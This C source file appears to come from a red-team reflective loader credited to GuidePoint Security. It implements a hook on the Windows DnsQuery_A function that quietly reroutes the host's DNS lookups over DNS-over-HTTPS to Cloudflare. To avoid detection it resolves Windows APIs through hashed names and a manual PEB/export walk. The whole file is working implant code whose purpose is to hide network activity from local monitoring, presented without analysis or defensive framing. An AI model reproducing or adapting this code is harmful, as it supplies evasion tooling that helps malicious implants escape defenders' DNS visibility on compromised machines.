/**
 *
 * Reflective Loader
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation
 *
**/

#include "Common.h"

NTSTATUS
NTAPI
RtlRandomEx(
	_Inout_ PULONG Seed
);

/* Functions */
typedef struct
{
	D_API( DnsExtractRecordsFromMessage_UTF8 );
	D_API( DnsWriteQuestionToBuffer_UTF8 );
	D_API( InternetQueryDataAvailable );
	D_API( RtlInitUnicodeString );
	D_API( InternetCloseHandle );
	D_API( InternetReadFile );
	D_API( HttpSendRequestA );
	D_API( HttpOpenRequestA );
	D_API( InternetConnectA );
	D_API( RtlAllocateHeap );
	D_API( HttpQueryInfoA );
	D_API( InternetOpenA );
	D_API( LdrUnloadDll );
	D_API( RtlRandomEx );
	D_API( RtlFreeHeap );
	D_API( LdrLoadDll );
} API ;

/* Hashes */
#define H_API_DNSEXTRACTRECORDSFROMMESSAGE_UTF8	0x300c2cf6 /* DnsExtractRecordsFromMessage_UTF8 */
#define H_API_DNSWRITEQUESTIONTOBUFFER_UTF8	0x8daca0d0 /* DnsWriteQuestionToBuffer_UTF8 */
#define H_API_INTERNETQUERYDATAAVAILABLE	0x48114d7f /* InternetQueryDataAvailable */
#define H_API_RTLINITUNICODESTRING		0xef52b589 /* RtlInitUnicodeString */
#define H_API_INTERNETCLOSEHANDLE		0x87a314f0 /* InternetCloseHandle */
#define H_API_INTERNETREADFILE			0x7766910a /* InternetReadFile */
#define H_API_HTTPSENDREQUESTA			0x2bc23839 /* HttpSendRequestA */
#define H_API_HTTPOPENREQUESTA			0x8b6ddc61 /* HttpOpenRequestA */
#define H_API_INTERNETCONNECTA			0xc058d7b9 /* InternetConnectA */
#define H_API_RTLALLOCATEHEAP			0x3be94c5a /* RtlAllocateHeap */
#define H_API_HTTPQUERYINFOA			0x9df7f348 /* HttpQueryInfoA */
#define H_API_INTERNETOPENA			0xa7917761 /* InternetOpenA */
#define H_API_LDRUNLOADDLL			0xd995c1e6 /* LdrUnloadDll */
#define H_API_RTLRANDOMEX			0x7f1224f5 /* RtlRandomEx */
#define H_API_RTLFREEHEAP			0x73a9e4d7 /* RtlFreeHeap */
#define H_API_LDRLOADDLL			0x9e456a43 /* LdrLoadDll */
#define H_LIB_NTDLL				0x1edab0ed /* ntdll.dll */

/*!
 *
 * Purpose:
 *
 * Redirects DnsQuery_A over a DNS/HTTP(s)
 * provider.
 *
!*/

D_SEC( D ) DNS_STATUS WINAPI DnsQuery_A_Hook( _In_ PCSTR pszName, _In_ WORD wType, _In_ DWORD Options, _In_ PVOID pExtra, _Out_ PDNS_RECORD * ppQueryResults, _In_ PVOID pReserved ) 
{
	API		Api;
	UNICODE_STRING	Uni;

	USHORT		Xid = 0;
	ULONG		Val = 0;
	ULONG		Cod = HTTP_STATUS_OK;
	BOOLEAN		Suc = FALSE;
	DNS_STATUS	Err = DNS_RCODE_SERVFAIL;
	SIZE_T		Len = 0;

	LPVOID		Res = NULL;
	LPVOID		Buf = NULL;
	HMODULE		Dns = NULL;
	HMODULE		Win = NULL;
	HINTERNET	Iop = NULL;
	HINTERNET	Icp = NULL;
	HINTERNET	Hop = NULL;
	ULONG_PTR 	Lst[] = { G_SYM( "mozilla.cloudflare-dns.com" ), G_SYM( "cloudflare-dns.com" ) };

	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );

	/* get NT API */
	Api.RtlInitUnicodeString = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLINITUNICODESTRING );
	Api.RtlAllocateHeap      = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLALLOCATEHEAP );
	Api.LdrUnloadDll         = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRUNLOADDLL );
	Api.RtlRandomEx          = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLRANDOMEX );
	Api.RtlFreeHeap          = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEHEAP );
	Api.LdrLoadDll           = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRLOADDLL );

	Val = Api.RtlRandomEx( &Val );
	Val = Api.RtlRandomEx( &Val );

	Api.RtlInitUnicodeString( &Uni, C_PTR( G_SYM( L"wininet.dll" ) ) );
	Api.LdrLoadDll( NULL, 0, &Uni, &Win );

	Api.RtlInitUnicodeString( &Uni, C_PTR( G_SYM( L"dnsapi.dll" ) ) );
	Api.LdrLoadDll( NULL, 0, &Uni, &Dns );

	if ( Win != NULL && Dns != NULL ) 
	{
		Api.DnsExtractRecordsFromMessage_UTF8 = PeGetFuncEat( Dns, H_API_DNSEXTRACTRECORDSFROMMESSAGE_UTF8 ); 
		Api.DnsWriteQuestionToBuffer_UTF8     = PeGetFuncEat( Dns, H_API_DNSWRITEQUESTIONTOBUFFER_UTF8 );
		Api.InternetQueryDataAvailable        = PeGetFuncEat( Win, H_API_INTERNETQUERYDATAAVAILABLE );
		Api.InternetCloseHandle               = PeGetFuncEat( Win, H_API_INTERNETCLOSEHANDLE );
		Api.InternetReadFile                  = PeGetFuncEat( Win, H_API_INTERNETREADFILE );
		Api.HttpSendRequestA                  = PeGetFuncEat( Win, H_API_HTTPSENDREQUESTA );
		Api.HttpOpenRequestA                  = PeGetFuncEat( Win, H_API_HTTPOPENREQUESTA );
		Api.InternetConnectA                  = PeGetFuncEat( Win, H_API_INTERNETCONNECTA );
		Api.HttpQueryInfoA                    = PeGetFuncEat( Win, H_API_HTTPQUERYINFOA );
		Api.InternetOpenA                     = PeGetFuncEat( Win, H_API_INTERNETOPENA );

		Iop = Api.InternetOpenA( NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0 );

		if ( Iop != NULL ) {
			Icp = Api.InternetConnectA( Iop,
					            C_PTR( Lst[ Val % ARRAYSIZE( Lst ) ] ),
						    INTERNET_DEFAULT_HTTPS_PORT,
						    NULL,
						    NULL,
						    INTERNET_SERVICE_HTTP,
						    0,
						    0 );

			if ( Icp == NULL ) {
				goto Leave;
			};

			Hop = Api.HttpOpenRequestA( Icp,
						    C_PTR( G_SYM( "POST" ) ),
						    C_PTR( G_SYM( "/dns-query" ) ),
						    NULL,
						    NULL,
						    NULL,
						    INTERNET_FLAG_NO_CACHE_WRITE |
						    INTERNET_FLAG_SECURE         |
						    INTERNET_FLAG_RELOAD	 |
						    INTERNET_FLAG_NO_UI,
						    0 );

			if ( Hop != NULL ) 
			{
				if ( Api.DnsWriteQuestionToBuffer_UTF8( Buf, &Len, pszName, wType, 0, TRUE ) ) {
					goto Leave;
				};
				if ( ! ( Buf = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, 0, Len ) ) ) {
					goto Leave;
				};

				Val = Api.RtlRandomEx( &Val );
				Val = Api.RtlRandomEx( &Val );
				Xid = ( UINT16 )( Val % ( UINT16_MAX + 1 ) );

				if ( Api.DnsWriteQuestionToBuffer_UTF8( Buf, &Len, pszName, wType, Xid, TRUE ) ) 
				{
					if ( Api.HttpSendRequestA( Hop, C_PTR( G_SYM( "Content-Type: application/dns-message" ) ), -1L, Buf, Len ) ) 
					{
						if ( Api.HttpQueryInfoA( Hop, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &Cod, &( DWORD ){ sizeof( DWORD ) }, NULL ) ) 
						{
							if ( Cod != HTTP_STATUS_OK ) {
								goto Leave;
							};
							if ( ! Api.InternetQueryDataAvailable( Hop, &Len, 0, 0 ) ) {
								goto Leave;
							};
							if ( ! ( Res = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, Len ) ) ) {
								goto Leave;
							};
							if ( Api.InternetReadFile( Hop, Res, Len, &( DWORD ){ 0 } ) ) 
							{
								DNS_BYTE_FLIP_HEADER_COUNTS( Res );
								Err = Api.DnsExtractRecordsFromMessage_UTF8( Res, Len, ppQueryResults );
							} else {
								goto Leave;
							};
						} else {
							goto Leave;
						};
					} else {
						goto Leave;
					};
				} else {
					goto Leave;
				};
			} else {
				goto Leave;
			};
		};
	Leave:
		if ( Res != NULL ) {
			Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Res );
			Res = NULL;
		};
		if ( Buf != NULL ) {
			Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Buf );
			Buf = NULL;
		};
		if ( Iop != NULL ) {
			Api.InternetCloseHandle( Iop );
			Iop = NULL;
		};
		if ( Icp != NULL ) {
			Api.InternetCloseHandle( Icp );
			Icp = NULL;
		};
		if ( Hop != NULL ) {
			Api.InternetCloseHandle( Hop );
			Hop = NULL;
		};
	};
	if ( Win != NULL ) {
		Api.LdrUnloadDll( Win );
		Win = NULL;
	};
	if ( Dns != NULL ) {
		Api.LdrUnloadDll( Dns );
		Dns = NULL;
	};
	return Err;
};
